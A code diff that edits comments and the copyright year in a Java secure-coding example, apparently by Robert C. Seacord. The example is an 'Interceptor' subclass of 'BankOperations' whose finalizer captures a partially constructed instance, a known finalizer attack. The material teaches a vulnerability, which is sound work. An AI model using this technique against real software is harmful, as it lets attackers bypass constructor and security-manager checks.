@@ -1,6 +1,6 @@
 // The MIT License (MIT)
 // 
-// Copyright (c) 2016 Robert C. Seacord
+// Copyright (c) 2018 Robert C. Seacord
 // 
 // Permission is hereby granted, free of charge, to any person obtaining a copy
 // of this software and associated documentation files (the "Software"), to deal
@@ -41,7 +41,7 @@ public class Interceptor extends BankOperations {
 			synchronized (Interceptor.class) {
 				while (stealInstance == null) {
 					System.gc();
-					Interceptor.class.wait(10);
+					Interceptor.class.wait(10);  // releases the lock on Interceptor.class
 				}
 			}
 		} catch (InterruptedException ex) {
@@ -50,8 +50,7 @@ public class Interceptor extends BankOperations {
 		return stealInstance;
 	}
 
-	// attacker's finalizer obtains and stores a reference by using the this
-	// keyword.
+	// attacker's finalizer obtains and stores a reference using "this".
 	@Override
   public void finalize() throws Throwable {
 		super.finalize();
@@ -59,7 +58,7 @@ public class Interceptor extends BankOperations {
 			stealInstance = this;
 			Interceptor.class.notify();
 		}
-		System.out.println("Stole the instance in finalize of " + this); //$NON-NLS-1$
+		System.out.println("Stole the instance in finalize of " + this);
 		// The attacker can now maliciously invoke any instance method
 		// on the base class by using the stolen instance reference. This attack
 		// can even bypass a check by a security manager.
